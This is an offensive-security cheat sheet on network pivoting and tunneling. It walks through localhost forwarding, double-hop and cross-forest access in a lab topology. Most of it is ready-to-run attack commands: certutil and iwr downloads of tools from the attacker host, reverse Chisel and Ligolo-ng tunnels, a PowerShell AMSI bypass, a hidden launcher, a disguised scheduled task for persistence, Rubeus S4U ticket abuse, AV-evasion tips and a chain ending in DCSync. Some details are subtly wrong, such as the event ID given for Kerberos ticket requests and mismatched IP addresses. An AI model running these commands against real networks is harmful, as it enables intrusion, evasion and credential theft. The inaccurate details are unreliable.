# PivoteEZ

### Modern Network Pivoting and Tunneling Reference
**From Localhost Forwarding to Cross-Forest Trust Abuse.**

- **Target Audience:** Penetration Testers, Red Team Operators, Network Engineers
- **Last Updated:** January 25, 2026
- **Tested Against:** Chisel, Ligolo-ng, Socat, Proxychains, OpenSSH, Netsh

---

## Table of Contents
1. [Pivoting Fundamentals & Taxonomy](#1-pivoting-fundamentals--taxonomy)
2. [Operational Environment Reference](#2-operational-environment-reference)
3. [Tooling Setup & Prerequisites](#3-tooling-setup--prerequisites)
4. [Linux Pivoting Deep Dive](#4-linux-pivoting-deep-dive)
5. [Windows Pivoting Deep Dive](#5-windows-pivoting-deep-dive)
6. [Tool Comparison Matrix](#6-tool-comparison-matrix)
7. [OPSEC & Detection Guide](#7-opsec--detection-guide)
8. [Troubleshooting Handbook](#8-troubleshooting-handbook)
9. [Attack Chain Integration](#9-attack-chain-integration)
10. [References & Further Reading](#10-references--further-reading)

---

## 1. Pivoting Fundamentals & Taxonomy

### What is Pivoting?
Pivoting is the technique of using a compromised host as a relay point to access systems that are unreachable from the attacker’s initial position. It transforms a single foothold into network-wide access by leveraging the target’s trust relationships and network topology.

### The 5 Pivoting Cases (Operational Taxonomy)

| Case | Topology Pattern | Attack Objective | Real-World Analogy |
| :--- | :--- | :--- | :--- |
| **Case-I** | Attacker -> Compromised Host -> Local Services | Access services bound to localhost/localhost-restricted interfaces on the compromised host. | Using a hotel room to access the hotel’s internal staff portal. |
| **Case-II** | Attacker -> Compromised Host -> Adjacent Subnet | Reach systems on networks directly connected to the compromised host. | Using the hotel room to access other rooms on the same floor. |
| **Case-III** | Attacker -> Host-A -> Host-B -> Target Subnet | Traverse multiple network segments through chained compromises. | Using hotel room -> staff elevator -> basement server room -> executive offices. |
| **Case-IV** | Attacker -> Compromised Host -> Multiple Subnets | Simultaneously access multiple network segments from a single pivot point. | Using one hotel room with doors to both the guest wing AND service corridor. |
| **Case-V** | Attacker -> Forest-A -> Trust Boundary -> Forest-B | Cross Active Directory forest trust boundaries. | Using credentials from Company A to access resources in Partner Company B via trust relationship. |

> **Critical Insight:** Pivoting isn’t just about tools—it’s about network topology mapping. Always run `ip route`, `ip neigh`, `arp -a`, and `netstat -rn` on compromised hosts before pivoting to understand reachable networks.

---

## 2. Operational Environment Reference

### Network Topology Diagram
```text
[ATTACKER: 192.168.118.4]
        |
        | (Initial Compromise)
        v
[CONFLUENCE01: 192.168.50.63] <- conf_user (Linux/Windows)
        |-----------|---------------|---------------|
   (Direct)    (Subnet-A)      (Subnet-B)     (Subnet-C)
        |           |               |               |
        |      [PGDATABASE01]    [MULTISERVER03]  [HRSHARES*]
        |      10.4.50.215       192.168.51.50    172.16.50.217
        |      database_admin    (various users)  (requires double-hop)
        |           |
        |           | (Requires Case-III pivot)
        |-----------|
```
*HRSHARES is not directly reachable from CONFLUENCE01—it requires pivoting through PGDATABASE01 (Case-III).*

### Command Reference Table

| Component | Value | OS | Credentials | Reachable Networks | Pivot Role |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **KALI-MACHINE** | 192.168.118.4 | Linux | kali | 192.168.118.0/24 | Attacker workstation |
| **CONFLUENCE01** | 192.168.50.63 | Linux/Windows | conf_user | 192.168.50.0/24, 10.4.50.0/24*, 192.168.51.0/24* | Primary pivot point |
| **PGDATABASE01** | 10.4.50.215 | Linux | database_admin | 10.4.50.0/24, 172.16.50.0/24* | Secondary pivot (Case-III) |
| **MULTISERVER03** | 192.168.51.50 | Windows/Linux | TBD | 192.168.51.0/24 | Target (Case-IV) |
| **HRSHARES** | 172.16.50.217 | Windows | TBD | 172.16.50.0/24 | Deep target (Case-III) |

*Networks marked with * require route propagation via pivoting tools (e.g., Ligolo-ng) or manual route addition.*

---

## 3. Tooling Setup & Prerequisites

### Essential Tools Installation Matrix

| Tool | Linux Install | Windows Transfer Method | Verification Command |
| :--- | :--- | :--- | :--- |
| **Chisel** | `go install github.com/jpillora/chisel@latest` | `certutil -urlcache -f http://192.168.118.4/chisel.exe chisel.exe` | `chisel --help` |
| **Ligolo-ng** | `go install github.com/sysdream/ligolo-ng/...@latest` | `iwr -uri http://192.168.118.4/agent.exe -OutFile agent.exe` | `./proxy --help` |
| **Socat** | `apt install socat -y` | Precompiled binaries from socat.org | `socat -h` |
| **Proxychains** | `apt install proxychains4 -y` | N/A (attacker-side only) | `proxychains4 -q curl ifconfig.me` |
| **Sshuttle** | `apt install sshuttle -y` | N/A (attacker-side only) | `sshuttle --version` |

### Critical Configuration Files

**/etc/proxychains4.conf (Attacker Machine)**
```ini
[ProxyList]
# For Chisel SOCKS5
socks5 127.0.0.1 1080

# For double-hop pivots (Case-III)
# socks5 127.0.0.1 2080
```

> **OPSEC Note:** Always use `proxychains4 -q` (quiet mode) to avoid leaking command output to logs. Never run `proxychains nmap` without `-sT -Pn` flags—SYN scans break through SOCKS proxies.

### SSH Hardening for Pivoting (~/.ssh/config)
```text
Host pivot-*
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR
    ServerAliveInterval 30
    ServerAliveCountMax 3
    Compression yes
    EscapeChar none
```

---

## 4. Linux Pivoting Deep Dive

### Case-I: Direct Port Forwarding
Accessing services bound to localhost on CONFLUENCE01.

#### Technique 1: Socat (TCP Forwarding)
```bash
socat -ddd TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:8090
```

**Command Anatomy Table:**
| Component | Purpose | OPSEC Consideration |
| :--- | :--- | :--- |
| `-ddd` | Debug verbosity (3 levels) | Remove in production—logs to stderr. |
| `TCP-LISTEN:8080` | Binds to all interfaces on port 8080 | Use `127.0.0.1:8080` to avoid exposing to network. |
| `fork` | Handles multiple connections | Required for web apps. |
| `reuseaddr` | Allows quick restarts | Prevents "address already in use" errors. |
| `TCP:127.0.0.1:8090` | Forward to localhost service | Never expose internal services directly. |

**Operational Workflow:**
```bash
# On CONFLUENCE01 (as conf_user)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:8090 &

# On KALI-MACHINE
curl http://192.168.50.63:8080  # Accesses localhost:8090 on CONFLUENCE01
```

> **Defensive Perspective:** EDRs detect socat spawning network listeners. Detection via Sigma Rule: `process_creation WHERE process_name="socat" AND command_line CONTAINS "TCP-LISTEN"`. Prevention: Application whitelisting blocking non-standard binaries.

#### Technique 2: SSH Local Port Forwarding
```bash
ssh -N -L 8080:127.0.0.1:8090 conf_user@192.168.50.63
```

**Command Anatomy Table:**
| Flag | Purpose | Critical Detail |
| :--- | :--- | :--- |
| `-N` | No remote command execution | Prevents shell allocation (quieter). |
| `-L [bind_addr:]port:host:hostport` | Local forward spec | Omit `bind_addr` to bind to `127.0.0.1` only. |
| `-f` | Background after auth | Use with `-N` for daemonization. |
| `-C` | Compression | Reduces bandwidth (helpful over slow links). |

**Advanced Usage - Expose to Network:**
```bash
# WARNING: Exposes service to entire 192.168.118.0/24 network
ssh -N -L 0.0.0.0:8080:127.0.0.1:8090 conf_user@192.168.50.63
```

> **OPSEC Failure Point:** Binding to `0.0.0.0` exposes your pivot to other hosts on the attacker network. Always use firewall rules:
> ```bash
> iptables -A INPUT -p tcp --dport 8080 -s 192.168.118.4 -j ACCEPT
> iptables -A INPUT -p tcp --dport 8080 -j DROP
> ```

#### Technique 3: Chisel Reverse Forwarding
```bash
# KALI-MACHINE
chisel server --port 8000 --reverse

# CONFLUENCE01
chisel client 192.168.118.4:8000 R:8080:127.0.0.1:8090
```

**Why Reverse?:** When the compromised host is behind a firewall that blocks inbound connections but allows outbound HTTP/HTTPS.

**Chisel Protocol Details:**
- Uses WebSocket over TLS by default (looks like normal HTTPS).
- Auto-reconnect with exponential backoff.
- Traffic encrypted even without `--tls` flag (uses Noise protocol).

> **Detection Evasion:** Chisel traffic mimics legitimate WebSocket traffic. Detection requires TLS JA3 fingerprinting (Chisel uses Go’s crypto/tls) and behavioral analysis of persistent WebSocket connections to non-web servers.

### Case-II: Single-Hop Pivoting
Accessing PGDATABASE01 (10.4.50.215) via CONFLUENCE01.

#### Technique 1: SSH Dynamic Forwarding (SOCKS5)
```bash
ssh -N -D 1080 conf_user@192.168.50.63
```

**Proxychains Integration:**
```ini
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

**Usage examples:**
```bash
proxychains4 nmap -sT -Pn -p 5432 10.4.50.215
proxychains4 psql -h 10.4.50.215 -U database_admin postgres
```

**Critical Flags for Nmap over SOCKS:**
| Flag | Why Required |
| :--- | :--- |
| `-sT` | TCP connect scan (SOCKS5 doesn’t support raw packets). |
| `-Pn` | Skip host discovery (ICMP blocked through proxies). |
| `-n` | Disable DNS resolution (prevents leaks). |
| `--disable-arp-ping` | ARP doesn’t work through proxies. |

#### Technique 2: Sshuttle (Transparent Proxy)
```bash
sshuttle -r conf_user@192.168.50.63 10.4.50.0/24 --dns
```

**How Sshuttle Works:**
- Creates a local TUN interface (`sshuttle-tun`).
- Routes specified subnets through this interface.
- Uses SSH to forward packets to remote host.
- Remote host performs actual network communication.

**Advantages Over SOCKS:**
- No application modification required (works at IP layer).
- DNS tunneling (`--dns` flag) prevents DNS leaks.
- Automatic route management.

> **OPSEC Warning:** Sshuttle creates visible network interfaces. Detection via:
> ```bash
> # On compromised host
> ip link show | grep sshuttle  # Visible interface
> ss -tulpn | grep sshuttle     # Persistent SSH connection
> ```

#### Technique 3: Ligolo-ng (TUN Interface)
```bash
# KALI-MACHINE
sudo ip tuntap add user $(whoami) mode tun ligolo0
sudo ip link set ligolo0 up
./proxy -selfcert

# CONFLUENCE01
./agent -connect 192.168.118.4:11601 -ignore-cert

# Inside Ligolo-ng console
ligolo-ng » session add 1
ligolo-ng » start
ligolo-ng » ip route add 10.4.50.0/24 dev ligolo0
```

**Ligolo-ng Architecture:**
```text
[Attacker] <--(TLS)--> [Proxy (KALI)] <--(TUN)--> [Kernel Routing] 
       ^
       |
       +-- [Agent (CONFLUENCE01)] <--(Network)--> [PGDATABASE01]
```

**Critical Commands:**
| Command | Purpose |
| :--- | :--- |
| `session list` | Show active agent connections. |
| `start` | Activate tunnel for current session. |
| `ip route add 10.4.50.0/24 dev ligolo0` | Route subnet through tunnel. |
| `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` | Forward reverse shells. |

> **Defensive Perspective:** Ligolo-ng agents make persistent outbound TLS connections. Detection via Network (persistent connections to non-standard ports like 11601), Host (unusual TUN interfaces via `ip link show type tun`), and EDR (child processes of web servers spawning network tools).

### Case-III: Double-Hop Pivoting
CONFLUENCE01 -> PGDATABASE01 -> HRSHARES (172.16.50.217).

#### Technique 1: Chisel Double Reverse Tunnel
```bash
# STEP 1: Primary tunnel (KALI <-> CONFLUENCE01)
# KALI-MACHINE
chisel server --port 8000 --reverse --socks5

# CONFLUENCE01
chisel client 192.168.118.4:8000 R:1080:socks

# STEP 2: Secondary tunnel (CONFLUENCE01 <-> PGDATABASE01)
# CONFLUENCE01 (start secondary server)
chisel server --port 8001 --reverse

# PGDATABASE01
chisel client 10.4.50.63:8001 R:2080:socks

# KALI-MACHINE: Configure chained proxy
# /etc/proxychains4.conf
socks5 127.0.0.1 1080   # First hop (CONFLUENCE01)
socks5 127.0.0.1 2080   # Second hop (PGDATABASE01 via first hop)
```

**Traffic Flow:**
`KALI -> [SOCKS5:1080] -> CONFLUENCE01 -> [SOCKS5:2080] -> PGDATABASE01 -> HRSHARES`

**Verification Command:**
```bash
proxychains4 curl -v http://172.16.50.217
# Watch for double proxying in verbose output
```

#### Technique 2: SSH ProxyJump (Modern OpenSSH)
```text
# ~/.ssh/config on KALI-MACHINE
Host pgdb
    HostName 10.4.50.215
    User database_admin
    ProxyJump conf_user@192.168.50.63
    IdentityFile ~/.ssh/pgdb_key

Host hrshares
    HostName 172.16.50.217
    User hr_user
    ProxyJump pgdb
```

**Usage:**
```bash
ssh hrshares  # Automatically hops through both systems
scp file.txt hrshares:/tmp/
```

> **OPSEC Advantage:** Uses legitimate SSH infrastructure. Detection requires SSH daemon logs showing chained connections (`/var/log/auth.log`) and network flow analysis showing SSH connections between internal hosts.

#### Technique 3: Ligolo-ng Double Interface
```bash
# KALI-MACHINE: Create two TUN interfaces
sudo ip tuntap add user $(whoami) mode tun ligolo0
sudo ip link set ligolo0 up
sudo ip tuntap add user $(whoami) mode tun ligolo1
sudo ip link set ligolo1 up

# Start proxy
./proxy -selfcert

# CONFLUENCE01: Connect first agent
./agent -connect 192.168.118.4:11601 -ignore-cert

# Inside Ligolo-ng console (first session)
ligolo-ng » session add 1
ligolo-ng » start --tun ligolo0
ligolo-ng » ip route add 10.4.50.0/24 dev ligolo0

# PGDATABASE01: Connect second agent THROUGH first tunnel
./agent -connect 10.4.50.63:11601 -ignore-cert  # Uses CONFLUENCE01's IP on 10.4.50.0/24

# Inside Ligolo-ng console (second session)
ligolo-ng » session add 2
ligolo-ng » start --tun ligolo1
ligolo-ng » ip route add 172.16.50.0/24 dev ligolo1
```

> **Critical Insight:** The second agent connects to `10.4.50.63:11601` (CONFLUENCE01’s IP on the `10.4.50.0/24` network), NOT the attacker’s IP. This demonstrates true double-hop pivoting.

### Case-IV: Multi-Subnet Aggregation
Accessing BOTH `10.4.50.0/24` (PGDATABASE01) AND `192.168.51.0/24` (MULTISERVER03) simultaneously.

#### Technique: Chisel Multi-Route SOCKS
```bash
# KALI-MACHINE
chisel server --port 8000 --reverse --socks5

# CONFLUENCE01
chisel client 192.168.118.4:8000 R:socks

# Verify routes on CONFLUENCE01 BEFORE pivoting
ip route show
# Should show:
# 192.168.50.0/24 dev eth0
# 10.4.50.0/24 dev eth1
# 192.168.51.0/24 via 192.168.50.1 dev eth0  <-- Critical: Must have route to 192.168.51.0/24
```

**Traffic Flow Diagram:**
```text
KALI-MACHINE
     |
     +--[SOCKS5:1080]--> CONFLUENCE01
                          |--> 10.4.50.0/24 (directly connected)
                          +--> 192.168.51.0/24 (via gateway 192.168.50.1)
```

**Verification Commands:**
```bash
# From KALI-MACHINE via proxychains
proxychains4 nmap -sT -Pn -sn 10.4.50.0/24 --reason
proxychains4 nmap -sT -Pn -sn 192.168.51.0/24 --reason

# Check which interface handles traffic (on CONFLUENCE01)
tcpdump -i any host 172.16.50.217 -n
# Should show traffic on eth1 (10.4.50.0/24 interface)
```

> **Critical Failure Point:** CONFLUENCE01 MUST have routes to both subnets. If missing:
> ```bash
> # On CONFLUENCE01 (as root)
> ip route add 192.168.51.0/24 via 192.168.50.1 dev eth0
> ```

### Case-V: Cross-Forest Pivoting
Pivoting between Active Directory forests via trust relationships.

#### Technique: Chisel with Kerberos Delegation Abuse
```bash
# Prerequisites:
# 1. Compromised account with Resource-Based Constrained Delegation (RBCD) rights
# 2. Access to target forest's domain controller via network path

# STEP 1: Establish pivot to first forest's DC
chisel client 192.168.118.4:8000 R:389:10.10.10.10:389  # DC01.contoso.com

# STEP 2: Abuse RBCD to request S4U2Self/S4U2Proxy tickets
# Using Rubeus from compromised host:
Rubeus.exe s4u /user:WEB01$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.europe.corp /ptt

# STEP 3: Pivot to second forest using Kerberos tickets
# Tickets now allow access to europe.corp resources
chisel client 192.168.118.4:8000 R:445:10.20.20.20:445  # FILESERVER.europe.corp
```

**Forest Trust Requirements:**
| Trust Type | Pivoting Possible? | Requirements |
| :--- | :--- | :--- |
| **External Trust** | Yes | Compromised account in trusting forest. |
| **Forest Trust** | Yes | SID filtering may limit access. |
| **Selective Authentication** | Limited | Must explicitly grant “Allowed to Authenticate”. |
| **No Trust** | No | Requires separate foothold. |

> **Defensive Perspective:** Cross-forest pivoting generates Event ID 4 (Kerberos service ticket request) with `TargetUserName` containing SPN from foreign forest and `TargetDomainName` showing foreign domain. Detection: Alert on service tickets requested for foreign domains by non-privileged accounts.

---

## 5. Windows Pivoting Deep Dive

### Critical Differences: Windows vs Linux Pivoting
| Factor | Linux | Windows |
| :--- | :--- | :--- |
| **Default SSH** | Usually present | Rarely present (requires OpenSSH feature). |
| **Firewall** | iptables/nftables | Windows Firewall (WFAS). |
| **Persistence** | systemd/cron | Scheduled Tasks/Services. |
| **Tool Transfer** | wget/curl | certutil/powershell. |
| **Interface Management** | ip/ifconfig | netsh. |

### Case-I: Direct Port Forwarding (Windows Target)

#### Technique 1: Plink (PuTTY Link)
```cmd
REM From CONFLUENCE01 (Windows)
plink.exe -ssh -l kali -pw "P@ssw0rd!" -R 8080:127.0.0.1:8090 192.168.118.4
```

**Plink Command Anatomy:**
| Flag | Purpose | Windows-Specific Note |
| :--- | :--- | :--- |
| `-R` | Remote port forward | Creates listener on attacker machine. |
| `-N` | No shell | Not supported in Plink—use `-batch` instead. |
| `-batch` | Suppress prompts | Critical for automation. |
| `-C` | Compression | Reduces bandwidth over RDP sessions. |

> **OPSEC Warning:** Plink stores passwords in command history. Safer alternative:
> ```cmd
> REM Use key authentication
> plink.exe -ssh -l kali -i kali_private.ppk -R 8080:127.0.0.1:8090 192.168.118.4
> ```

#### Technique 2: Chisel (Windows Native)
```cmd
REM KALI-MACHINE
chisel server --port 8000 --reverse

REM CONFLUENCE01 (PowerShell)
.\chisel.exe client 192.168.118.4:8000 R:8080:127.0.0.1:8090
```

**Windows-Specific Hardening:**
```powershell
# Bypass AMSI for chisel execution (if needed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Hide console window (advanced OPSEC)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "chisel.exe"
$psi.Arguments = "client 192.168.118.4:8000 R:8080:127.0.0.1:8090"
$psi.WindowStyle = 'Hidden'
[System.Diagnostics.Process]::Start($psi)
```

> **Defensive Perspective:** Windows Defender flags Chisel as `Trojan:Win32/Wacatac.B!ml`. Evasion requires custom compilation with modified strings, process injection into trusted processes (e.g., `dllhost.exe`), or living-off-the-land alternatives (netsh portproxy).

#### Technique 3: Netsh Port Proxy (Native Windows)
```cmd
REM Requires Administrator privileges
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8090 connectaddress=127.0.0.1
```

**Advantages:**
- Native Windows component (no AV alerts).
- Survives reboots (persists in registry).
- No additional binaries required.

**Verification:**
```cmd
netsh interface portproxy show all
# Shows active port forwarding rules

netstat -ano | findstr :8080
# Verify listener is active
```

**Cleanup:**
```cmd
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

> **Detection:** Portproxy rules stored in registry: `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4`. Sigma Rule: `registry_event WHERE registry_key CONTAINS "PortProxy"`.

### Case-II Through Case-V (Windows)
All techniques from the Linux section apply with these Windows-specific adaptations:

**Tool Execution:**
- Use `.exe` binaries instead of ELF.
- Transfer via `certutil -urlcache -f http://ATTACKER/file.exe file.exe`.
- Bypass AMSI with PowerShell reflection before execution.

**Firewall Management:**
```powershell
# Allow inbound on pivot port (if needed)
New-NetFirewallRule -DisplayName "Pivot" -Direction Inbound -LocalPort 8000 -Protocol TCP -Action Allow
```

**Persistence for Pivots:**
```powershell
# Create scheduled task that restarts chisel on reboot
$action = New-ScheduledTaskAction -Execute "chisel.exe" -Argument "client 192.168.118.4:8000 R:socks"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemService" -Action $action -Trigger $trigger -RunLevel Highest
```

**Process Injection (Advanced OPSEC):**
- Inject chisel into `dllhost.exe` using Cobalt Strike or custom shellcode to avoid spawning suspicious processes.

> **Critical Windows Limitation:** Windows SOCKS proxies (via Chisel) cannot handle UDP traffic reliably. For DNS tunneling, prefer Ligolo-ng (TUN interface handles UDP) or DNS2TCP (dedicated DNS tunneling tool).

---

## 6. Tool Comparison Matrix

| Tool | Protocol | Encryption | UDP Support | Windows Native | OPSEC Rating | Best Use Case |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Chisel** | WebSocket | TLS/Noise | No | Yes (.exe) | 4/5 | General-purpose pivoting |
| **Ligolo-ng** | Custom TLS | TLS 1.3 | Yes | Yes (.exe) | 5/5 | Full network access (TUN) |
| **SSH** | SSH | SSH | Limited | Rarely | 3/5 | Environments with SSH deployed |
| **Socat** | Raw TCP/UDP | None | Yes | Manual | 2/5 | Quick one-off forwards |
| **Sshuttle** | SSH | SSH | DNS only | No | 3/5 | Transparent subnet access |
| **Netsh** | Raw TCP | None | No | Yes | 4/5 | AV-evading port forwarding |
| **Plink** | SSH | SSH | No | Yes | 2/5 | Legacy Windows without OpenSSH |

*OPSEC Rating Guide: 1 = High detection risk, 5 = Low detection risk.*

---

## 7. OPSEC & Detection Guide

### Detection Vectors by Tool
| Tool | Network Detection | Host Detection | Log Artifacts |
| :--- | :--- | :--- | :--- |
| **Chisel** | Persistent WebSocket to non-80/443 ports | `chisel.exe` process | Windows Event ID 4688 (process creation) |
| **Ligolo-ng** | TLS to non-standard ports (11601) | TUN interface creation | Sysmon Event ID 1 (process) + 10 (process access) |
| **SSH** | SSH protocol on non-22 ports | `ssh` process with unusual args | `/var/log/auth.log` (Linux), Event ID 4624/4625 (Windows) |
| **Socat** | Raw TCP listeners | `socat` process | Process creation logs |
| **Netsh** | None (uses OS networking) | Registry modifications | Windows Event ID 4657 (registry value set) |

### Evasion Techniques Matrix
| Detection Vector | Evasion Technique | Effectiveness |
| :--- | :--- | :--- |
| **AV Signature** | Custom compile with modified strings | 5/5 |
| **Network Port** | Bind to 443/80 with TLS | 4/5 |
| **Process Name** | Rename binary to `svchost.exe` | 2/5 (still flagged by behavior) |
| **Parent Process** | Inject into `explorer.exe` | 4/5 |
| **Log Volume** | Use `-q` flags, disable debug | 3/5 |
| **TLS Fingerprint** | Use system TLS libraries (not Go) | 4/5 |

### Critical OPSEC Rules for Pivoting
1. Never pivot directly to Domain Controllers without mimikatz cleanup—DCs have aggressive logging.
2. Always use encrypted tunnels (Chisel/Ligolo) over raw socat in modern environments.
3. Limit pivot duration—establish access, complete objective, tear down tunnel.
4. Clean up artifacts:
   ```bash
   # Linux
   pkill -f chisel; pkill -f socat; ip tuntap del ligolo0 mode tun

   # Windows (PowerShell)
   Stop-Process -Name chisel -Force; netsh interface portproxy reset
   ```
5. Route minimally—only add routes for specific target IPs, not entire `/24` subnets.

---

## 8. Troubleshooting Handbook

### Common Failure Scenarios & Fixes
| Symptom | Root Cause | Solution |
| :--- | :--- | :--- |
| **Connection refused via proxy** | Target service not running | Verify with `netstat -tulpn \| grep <port>` on pivot host. |
| **No route to host** | Missing route on pivot host | `ip route add <subnet> via <gateway>` on Linux; `route add` on Windows. |
| **Proxy error: connection reset** | Firewall blocking pivot traffic | Test with `tcpdump` on pivot host to see if packets arrive. |
| **Chisel: connection closed** | TLS certificate mismatch | Use `-ignore-cert` flag on agent. |
| **Ligolo: session timeout** | Unstable network connection | Increase timeout: `./agent -connect ... -timeout 30s`. |
| **SSH: channel 3: open failed** | Remote host unreachable from pivot | Verify connectivity FROM pivot host first: `ssh user@target`. |
| **Proxychains: no socket** | Proxy not running/listening | Check with `ss -tulpn \| grep 1080`. |

### Diagnostic Command Cheat Sheet
```bash
# On PIVOT HOST (Linux)
ip route show                  # Verify network routes
ss -tulpn | grep LISTEN        # Check active listeners
tcpdump -i any -n port 8000    # Monitor pivot traffic
netstat -rn                    # Alternative route check

# On PIVOT HOST (Windows)
route print                    # Show routing table
netstat -ano | findstr LISTEN  # Active listeners
Test-NetConnection 10.4.50.215 -Port 5432  # PowerShell connectivity test

# On ATTACKER MACHINE
proxychains4 curl -v http://target  # Verbose proxy test
nc -zv 127.0.0.1 1080           # Verify SOCKS listener
```

---

## 9. Attack Chain Integration

### Full Pivot-to-Domain-Admin Scenario
```text
[Initial Foothold: CONFLUENCE01]
        |
        v
{Pivot Type?} --(Case-II)--> [Access PGDATABASE01 via Chisel SOCKS]
        |                            |
        |                            v
        |                    [Dump PostgreSQL creds with pg_dumpall]
        |                            |
        |                            v
        |                    [SSH to PGDATABASE01 as database_admin]
        |                            |
        |                            v
        |                    {Pivot Type?} --(Case-III)--> [Access HRSHARES via double-hop Ligolo]
        |                            |                            |
        |                            |                            v
        |                            |                    [Dump SAM/SYSTEM hives with reg save]
        |                            |                            |
        |                            |                            v
        |                            |                    [Crack NTLM hashes with hashcat]
        |                            |                            |
        |                            |                            v
        |                            |                    [Pass-the-Hash to DC with pth-winexe]
        |                            |                            |
        |                            |                            v
        |                            |                    [DCSync attack with secretsdump.py]
        |                            |                            |
        |                            |                            v
        |                            +------------------------> [Domain Admin Access]
```

### Critical Pivot Points in AD Attacks
| Attack Stage | Required Pivot | Tool Recommendation |
| :--- | :--- | :--- |
| **Initial Access** | None | N/A |
| **Internal Recon** | Case-II (single hop) | Chisel SOCKS5 |
| **Lateral Movement** | Case-II/III | Ligolo-ng (for RDP/SMB) |
| **Domain Controller Access** | Case-III (double hop) | Ligolo-ng with route propagation |
| **Forest Trust Abuse** | Case-V | Chisel + Rubeus for Kerberos abuse |

> **Pro Tip:** Always maintain at least two independent pivot paths to critical targets. If one tunnel dies during DCSync, you won’t lose Domain Admin access.

---

## 10. References & Further Reading

### Official Documentation
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng)
- [Sshuttle Man Page](https://github.com/sshuttle/sshuttle)
- [Microsoft Netsh Portproxy Guide](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-portproxy)

### Advanced Pivoting Research
- Pivoting with Chisel (ap3x)
- Ligolo-ng Deep Dive (Sysdream)
- Cross-Forest Attacks (Harmj0y)
- OPSEC for Pivoting (Cobalt Strike Blog)

### Detection Resources
- Sigma Rules for Tunneling Tools
- Atomic Red Team - Lateral Movement
- MITRE ATT&CK: T1572 (Protocol Tunneling)
